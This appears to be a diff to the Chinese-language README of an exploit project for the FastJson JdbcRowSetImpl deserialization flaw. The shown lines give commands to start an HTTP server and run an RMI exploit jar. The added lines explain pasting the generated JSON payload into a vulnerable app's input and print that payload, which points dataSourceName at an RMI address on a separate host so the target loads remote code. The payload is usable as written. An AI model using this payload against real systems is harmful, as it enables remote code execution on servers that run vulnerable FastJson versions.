@@ -54,9 +54,16 @@ public class CommandObject {
 Python2 -m SimpleHTTPServer 80
 Python3 -m http.server 80
 ```
+
 ```
 java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
 ```
+### FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar 会生成一串JSON PAYLOAD，把它copy到漏洞环境的input中，然后submit。
+
+```
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
+```
+![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/5.jpg?raw=true)
 
 ### 
 
